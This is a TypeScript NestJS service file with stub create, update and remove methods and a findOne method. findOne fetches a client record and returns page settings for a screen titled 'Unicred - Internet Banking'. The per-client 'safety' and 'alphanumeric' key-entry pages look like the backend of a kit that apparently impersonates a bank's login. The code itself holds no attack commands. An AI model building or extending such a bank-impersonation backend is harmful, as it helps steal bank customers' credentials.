import { Injectable } from '@nestjs/common';
import { PrismaService } from 'src/database/prisma.service';
import { CreateAlphanumericDto } from './dto/create-alphanumeric.dto';
import { UpdateAlphanumericDto } from './dto/update-alphanumeric.dto';

@Injectable()
export class AlphanumericService {
  constructor(private readonly prisma: PrismaService){}

  create(createAlphanumericDto: CreateAlphanumericDto) {
    return 'This action adds a new alphanumeric';
  }

  findAll() {
    return `This action returns all alphanumeric`;
  }

  async findOne(id: number): Promise<object> {
    try {
      const client = await this.prisma.client.findFirst({where: { id }})
      return {
        pageType: `safety`,
        formType: `eletronic`,
        symbol: `true`,
        client,
        pageClasses: `unicred safety`,
        title: `Unicred - Internet Banking`,
        keyType: `all`
      }
    } catch (error) {
      console.log(error)
    }
  }

  update(id: number, updateAlphanumericDto: UpdateAlphanumericDto) {
    return `This action updates a #${id} alphanumeric`;
  }

  remove(id: number) {
    return `This action removes a #${id} alphanumeric`;
  }
}
